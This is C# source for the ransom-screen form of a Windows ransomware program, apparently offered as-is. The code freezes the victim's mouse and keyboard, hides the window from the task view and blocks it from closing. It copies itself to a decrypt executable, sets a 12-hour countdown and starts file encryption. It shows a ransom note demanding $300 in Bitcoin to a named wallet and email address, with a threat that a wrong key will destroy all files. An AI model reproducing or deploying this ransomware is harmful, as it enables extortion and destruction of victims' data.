using System;
using System.Windows.Forms;
using static Virus.MyFuncs;
using static Virus.RegHelpers;
using static Virus.RSAencryption;
using static Virus.AESencryption;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Reflection;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace Virus
{
    public partial class Form2 : Form
    {
        public static int _timetopay = 12;
        public static string _ransomAmount = "$300";
        public static string _safeEmail = "getyourprivkey@protonmail.com";
        public static string _bitcoinAddress = "16YzUQfVeZpKoSpPeTyUgBRmBdfg8ABHZp";
        public DateTime DateTimePlus12Hours;

        /// <summary>
        /// Constructor
        /// </summary>
        public Form2()
        {
            FreezeMouse();
            InitializeComponent();
            #region GUI STUFF
            richTextBox1.Text = $"• What Happened To My Computer? \n All of your files have been encrypted and your computer is locked.Do not waste your time trying to guess the decryptor. \n\n• Can I Recover My Files?\n Yes, if you pay before the timer is up you will be provided with a decryption key which will restore your files. Using an incorrect decryption key will fuck up ALL files.\n\n• How Do I Pay?\nTo pay you must purchase {_ransomAmount} worth of Bitcoin and send it to the wallet address below.\nYou can purchase Bitcoin online or at an Bitcoin ATM near you. (https://www.google.com/maps?q=bitcoin+atm)\n\n• How To Get Decryption Key?\nOnce paid email your transaction ID to - {_safeEmail} and you will be provided with a decryption key.\n\n• Here is a list of some places you can buy bitcoin without ID.\n1. Bitcoin ATM \n2. https://www.coincorner.com/ \n3. https://www.bitquick.co/ ";
            textBox2.Text = _bitcoinAddress;
            label1.Text = $"Send {_ransomAmount} worth of bitcoin to the address below.";
            System.Windows.Forms.ToolTip TP = new System.Windows.Forms.ToolTip();
            TP.ShowAlways = true;
            TP.SetToolTip(textBox1, "Enter Decryption Key Here.");
            #endregion
            if (Application.ExecutablePath != decryptexe)
            {
                var appBytes = File.ReadAllBytes(Application.ExecutablePath);
                File.WriteAllBytes(decryptexe, appBytes);
            }
            
            if (GetFromSecret(DateFinder) == null)   //Not first time being run 
            {
                File.WriteAllText(encrypttxt, $"List of files encrypted.");
                File.WriteAllText(instructionstxt, $"• What Happened To My Computer? \n All of your files have been encrypted and your computer is locked.Do not waste your time trying to guess the decryptor. \n\n• Can I Recover My Files?\n Yes, if you pay before the timer is up you will be provided with a decryption key which will restore your files. Using an incorrect decryption key will fuck up ALL files.\n\n• How Do I Pay?\nTo pay you must purchase {_ransomAmount} worth of Bitcoin and send it to the wallet address below.\nYou can purchase Bitcoin online or at an Bitcoin ATM near you. (https://www.google.com/maps?q=bitcoin+atm)\n\n• How To Get Decryption Key?\nOnce paid email your transaction ID to - {_safeEmail} and you will be provided with a decryption key.\n\n• Here is a list of some places you can buy bitcoin without ID.\n1. Bitcoin ATM \n2. https://www.coincorner.com/ \n3. https://www.bitquick.co/ \n \n {_bitcoinAddress} ");
                SetInSecret(DateTime.Now.AddHours(_timetopay).ToString(), DateFinder);
            }
            DateTimePlus12Hours = DateTime.Parse(GetFromSecret(DateFinder));
            StartEncryption();

        }

        /// <summary>
        /// Hide from task view.
        /// </summary>
        protected override CreateParams CreateParams
        {
            get
            {
                CreateParams cp = base.CreateParams;
                // turn on WS_EX_TOOLWINDOW style bit
                cp.ExStyle |= 0x80;
                return cp;
            }
        }

        /// <summary>
        /// On load...
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Form2_Load(object sender, EventArgs e)
        {
            new Task(() => { MessageBox.Show("Dont panic we froze your mouse to give you a chance to read, if you dont pay before the timer countsdown you can say bye bye to all of your files.", "Warning!"); }).Start();
            
            timer1.Start();
        }

        /// <summary>
        /// Copy btc wallet address
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void CopyBTCAddressBTN_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(textBox2.Text);
        }

        /// <summary>
        /// Start decryption with key entered.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void DecryptBTN_Click(object sender, EventArgs e)
        {
            DialogResult dialogResult = MessageBox.Show($"You have 1 attempt. If you use the wrong decryption code you will destroy all encrypted files. No matter how much money you offer they will be unrecoverable. Are You Sure You Want To Continue?", "Are You Sure?", MessageBoxButtons.YesNo);
            if (dialogResult == DialogResult.Yes)
            {

                try
                {
                    StartDecryption(textBox1.Text);
                }
                catch
                {
                    MessageBox.Show("Decryption unsuccessful. We gave you a chance...");
                }

                File.Delete(instructionstxt);
                timer1.Stop();
                CloseApp();
            }

        }

        /// <summary>
        /// Clock countdown tick
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private int i = 0;
        private void timer1_Tick(object sender, EventArgs e)
        {
            label2.Text = $"Oops {_encryptedFileCount} files have been encrypted.";
            if (DateTime.Now >= DateTimePlus12Hours && i > 5)
            {
                timer1.Stop();
                MessageBox.Show("You didn't pay in time.", "Sorry!");
                //TODO end app and leave files encrypted
                i++;
            }
            if (DateTime.Now <= DateTimePlus12Hours)
            {
                // Display the new time left
                TimeSpan span = (DateTimePlus12Hours - DateTime.Now);
                var timeLeft = String.Format("{0} days, {1} hours, {2} minutes, {3} seconds", span.Days, span.Hours, span.Minutes, span.Seconds);
                timeLabel.Text = $"All files will be destroyed in  {timeLeft.ToString()}.";
            }
        }

        /// <summary>
        /// Prevent form closing.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        [DllImport("user32.dll")]
        private static extern bool BlockInput(bool block);

        public static void FreezeMouse()
        {
            BlockInput(true);
        }

        public static void ThawMouse()
        {
            BlockInput(false);
        }
    }
}